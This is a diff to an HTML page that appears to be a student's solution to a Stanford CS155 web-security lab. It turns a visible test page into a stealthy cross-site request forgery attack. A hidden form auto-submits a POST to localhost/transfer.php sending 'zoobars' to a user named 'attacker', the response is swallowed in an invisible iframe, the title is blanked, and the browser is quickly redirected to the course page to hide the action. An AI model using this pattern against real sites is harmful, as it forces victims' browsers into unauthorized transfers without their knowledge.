@@ -2,42 +2,22 @@
 <html>
 
 	<head>
-		<title>Legit Website</title>
+		<title>&nbsp;</title>
 	</head>
 
 	<body>
-		<h1>Welcome to a Non-sketchy Website!</h1>
+		<iframe id="myFrame" style="display:none"></iframe>
 
-		<iframe id="myFrame" style=""></iframe>
-
-		<form id="myForm" action="localhost/transfer.php?" method="POST">
-			<input type="text" name="zoobars" value="1">
-			<input type="text" name="recepient" value="attacker">
+		<form id="myForm" style="display:none" action="http://localhost/transfer.php" method="POST" target="myFrame">
+			<input type="text" name="zoobars" value="1"> <!-- TODO: need to change this to value=10 -->
+			<input type="text" name="recipient" value="attacker">
 			<input type="text" name="submission" value="Send">
 		</form>
 
 		<script>
 			document.getElementById("myForm").submit();
+			setTimeout(function(){document.location.href="http://crypto.stanford.edu/cs155/"},50)
 		</script>
 	</body>
 
-	<script>
-		f = document.getElementById("myFrame");
-		f.innerHTML = "<p>Hello vato!</p>"
-	</script>
-
 </html>
-
-<!-- 
-		
-
-			<form id="myForm" action="localhost/transfer.php?" method="POST">
-				<input type="text" name="zoobars" value="1">
-				<input type="text" name="recepient" value="attacker">
-				<input type="text" name="submission" value="Send">
-			</form>
-
-			<script>
-				document.getElementById("myForm").submit();
-			</script>
- -->
